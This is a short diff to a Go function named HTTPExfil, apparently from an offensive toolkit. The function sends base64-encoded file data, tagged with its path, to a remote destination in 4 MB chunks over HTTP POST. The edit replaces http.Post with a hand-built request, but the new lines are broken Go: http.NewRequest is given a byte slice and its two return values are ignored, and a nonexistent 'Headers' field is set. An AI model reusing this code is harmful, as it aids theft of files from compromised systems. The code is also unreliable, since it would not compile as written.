@@ -269,6 +269,7 @@ func HTTPExfil(
 		var data []byte
 		var e error
 		var n int
+		var r *http.Request
 		var stream = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
@@ -287,7 +288,9 @@ func HTTPExfil(
 			data = []byte(path + " " + b64)
 
 			// Send Message
-			http.Post(dst, headers, data)
+			r = http.NewRequest(http.MethodPost, dst, data)
+			r.Headers = headers
+			http.DefaultClient.Do(r)
 		}
 	}
 
